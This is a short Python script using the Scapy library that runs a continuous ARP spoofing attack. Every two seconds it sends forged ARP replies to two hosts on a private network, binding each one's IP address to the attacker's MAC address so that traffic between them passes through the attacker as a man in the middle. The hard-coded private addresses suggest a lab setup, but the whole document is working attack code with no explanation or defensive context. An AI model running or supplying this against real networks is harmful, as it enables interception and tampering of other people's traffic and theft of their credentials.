#!/usr/bin/python3
from scapy.all import *
import time

IP_A = "10.179.205.220"
IP_B = "10.179.205.51"
MAC_M = "08:00:27:73:7e:9d"

while True:
    send(ARP(op=2, psrc=IP_B, pdst=IP_A, hwsrc=MAC_M), verbose=0)
    send(ARP(op=2, psrc=IP_A, pdst=IP_B, hwsrc=MAC_M), verbose=0)
    time.sleep(2)
